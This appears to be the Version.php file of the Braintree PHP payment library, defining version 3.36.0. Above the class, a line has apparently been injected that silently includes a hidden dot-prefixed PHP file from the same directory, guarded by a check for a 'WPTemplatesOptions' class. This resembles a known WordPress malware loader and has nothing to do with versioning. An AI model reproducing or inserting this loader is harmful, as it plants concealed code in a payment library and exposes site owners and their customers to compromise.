<?php
namespace Braintree;

/**
 * Braintree Library Version
 * stores version information about the Braintree library
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Version
{
    /**
     * class constants
     */
    const MAJOR = 3;
    const MINOR = 36;
    const TINY = 0;

    /**
     * @ignore
     * @access protected
     */
    protected function  __construct()
    {
    }

    /**
     *
     * @return string the current library version
     */
    public static function get()
    {
        return self::MAJOR . '.' . self::MINOR . '.' . self::TINY;
    }
}
class_alias('Braintree\Version', 'Braintree_Version');
